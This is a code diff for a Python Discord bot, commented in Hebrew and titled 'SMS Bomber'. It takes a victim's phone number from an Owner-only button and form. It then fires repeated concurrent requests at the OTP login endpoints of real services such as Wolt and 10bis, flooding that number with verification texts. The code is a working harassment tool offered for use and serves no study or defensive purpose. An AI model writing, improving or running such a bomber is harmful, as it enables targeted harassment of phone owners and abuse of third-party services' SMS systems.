@@ -1,10 +1,11 @@
 import discord
+from discord import app_commands
 from discord.ext import commands
 import os
 import httpx
 import asyncio
 
-# משיכת הטוקן מהגדרות ה-Render (חשוב!)
+# משיכת הטוקן מה-Environment של Render
 TOKEN = os.getenv("DISCORD_TOKEN")
 OWNER_ROLE_NAME = "Owner"
 
@@ -14,10 +15,9 @@ class SpamView(discord.ui.View):
 
     @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.primary, emoji="🚀", custom_id="spam_btn")
     async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-        # בדיקת רול Owner
         role = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)
         if not role:
-            return await interaction.response.send_message("❌ רק מי שיש לו רול Owner יכול להפעיל!", ephemeral=True)
+            return await interaction.response.send_message("❌ רק Owner יכול להפעיל!", ephemeral=True)
         await interaction.response.send_modal(SpamModal())
 
 class SpamModal(discord.ui.Modal, title="SMS Bomber"):
@@ -27,7 +27,6 @@ class SpamModal(discord.ui.Modal, title="SMS Bomber"):
         phone_val = self.phone.value
         await interaction.response.send_message(f"💣 הפצצה על {phone_val} יוצאת לדרך...", ephemeral=True)
         
-        # מאגר הכתובות המלא
         endpoints = [
             {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{phone_val[1:]}"}},
             {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone_val, "isSmsAuth": True}},
@@ -46,7 +45,7 @@ class SpamModal(discord.ui.Modal, title="SMS Bomber"):
         headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
 
         async with httpx.AsyncClient(headers=headers, timeout=5.0) as client:
-            for _ in range(2): # 2 סבבים
+            for _ in range(2):
                 tasks = [client.post(api["url"], json=api.get("json")) for api in endpoints]
                 await asyncio.gather(*tasks, return_exceptions=True)
                 await asyncio.sleep(5)
@@ -55,29 +54,29 @@ class SpamModal(discord.ui.Modal, title="SMS Bomber"):
 
 class MyBot(commands.Bot):
     def __init__(self):
-        # הגדרת Intents כדי שהבוט יוכל לזהות פקודות ורולים
         intents = discord.Intents.default()
-        intents.message_content = True
-        intents.members = True 
         super().__init__(command_prefix="!", intents=intents)
 
     async def setup_hook(self):
         self.add_view(SpamView())
+        # מסנכרן את פקודות הסלאש (/) עם השרתים של דיסקורד
+        await self.tree.sync()
+        print("✅ Slash Commands Synced!")
 
 bot = MyBot()
 
-@bot.command()
-@commands.has_role(OWNER_ROLE_NAME)
-async def setup(ctx):
+@bot.tree.command(name="setup", description="מפעיל את פאנל ההפצצה")
+async def setup(interaction: discord.Interaction):
+    role = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)
+    if not role:
+        return await interaction.response.send_message("❌ אין לך הרשאת Owner!", ephemeral=True)
+    
     embed = discord.Embed(
-        title="Spam sms bomber | Admin Panel",
-        description="**👑 Owner Access Only**\nClick below to start.",
-        color=discord.Color.blue()
+        title="Spam SMS Bomber | Admin Panel",
+        description="**👑 Owner Access Only**\nלחץ על הכפתור למטה כדי להתחיל.",
+        color=discord.Color.red()
     )
-    await ctx.send(embed=embed, view=SpamView())
+    await interaction.response.send_message(embed=embed, view=SpamView())
 
 if __name__ == "__main__":
-    if not TOKEN:
-        print("❌ שגיאה: לא נמצא DISCORD_TOKEN ב-Environment Variables!")
-    else:
-        bot.run(TOKEN)
+    bot.run(TOKEN)
